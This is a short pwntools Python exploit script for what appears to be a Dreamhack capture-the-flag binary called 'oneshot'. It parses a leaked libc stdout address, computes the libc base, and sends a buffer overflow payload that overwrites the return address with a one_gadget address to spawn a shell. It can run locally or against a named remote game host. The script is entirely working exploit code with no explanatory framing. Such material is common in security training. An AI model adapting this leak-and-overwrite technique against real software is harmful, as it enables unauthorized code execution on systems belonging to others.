#!/usr/bin/python3

from pwn import *

exe = ELF("./oneshot_patched")
libc = ELF("./libc.so.6")
context.binary = exe

s   = lambda data: p.send(data)
sa  = lambda msg, data: p.sendafter(msg, data)
sl  = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn  = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())



if args.REMOTE:
    p = remote('host8.dreamhack.games', 13105)
else:
    p = process([exe.path])

p.recvuntil(b'stdout: ')
libc_leak = int(p.recvline(), 16)
libc.address = libc_leak - libc.sym._IO_2_1_stdout_
log.info("libc leak :" + hex(libc_leak))
log.info("libc base :" + hex(libc.address))
one_gadget = libc.address + 0x45216
payload = b'A' * 24
payload += p64(0)
payload += b'B' * 8
payload += p64(one_gadget)  
sla(b'MSG: ',payload)
p.interactive()

